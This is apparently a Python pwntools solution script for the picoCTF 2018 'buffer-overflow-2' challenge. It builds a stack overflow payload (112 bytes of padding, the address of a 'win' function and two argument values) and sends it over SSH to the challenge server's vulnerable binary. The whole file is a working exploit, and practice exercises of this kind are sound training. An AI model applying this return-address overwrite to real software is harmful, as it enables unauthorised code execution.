#!/usr/bin/python

from pwn import *

vuln = ELF('./vuln')
padding = 'A' * 112
payload = p32(vuln.symbols['win'])

exploit = padding + payload + asm('nop') * 4 + p32(0xDEADBEEF) + p32(0xDEADC0DE)

s = ssh(host='2018shell1.picoctf.com', user='Platy')

py = s.run('cd /problems/buffer-overflow-2_0_738235740acfbf7941e233ec2f86f3b4; ./vuln')
print py.recv()
py.sendline(exploit)
print py.recv()
s.close()
